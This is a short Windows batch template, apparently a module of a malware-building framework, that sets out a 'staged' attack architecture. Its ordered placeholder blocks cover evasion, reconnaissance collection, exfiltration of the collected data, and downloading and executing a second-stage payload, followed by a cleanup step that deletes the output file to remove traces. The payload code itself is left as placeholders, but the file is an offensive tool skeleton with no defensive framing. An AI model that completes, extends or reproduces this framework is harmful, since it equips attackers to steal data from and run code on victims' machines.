REM provides: arch_staged
REM depends: (none)
REM description: Staged architecture - recon first, then download and exec second stage

@echo off
setlocal EnableDelayedExpansion

REM === VARS ===
REM {{VARS_BLOCK}}

REM === INIT OUTPUT ===
REM {{CHUNK:core/output}}

REM === EVASION ===
REM {{EVASION_BLOCK}}

REM === STAGE 1: RECON ===
REM {{COLLECTORS_BLOCK}}

REM === STAGE 1: EXFIL RECON DATA ===
REM {{EXFIL_BLOCK}}

REM === STAGE 2: DOWNLOAD AND EXECUTE ===
REM {{CHUNK:delivery/downloader}}
REM {{CHUNK:delivery/stager}}

REM === CLEANUP ===
if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%" >nul 2>nul

endlocal
exit /b 0
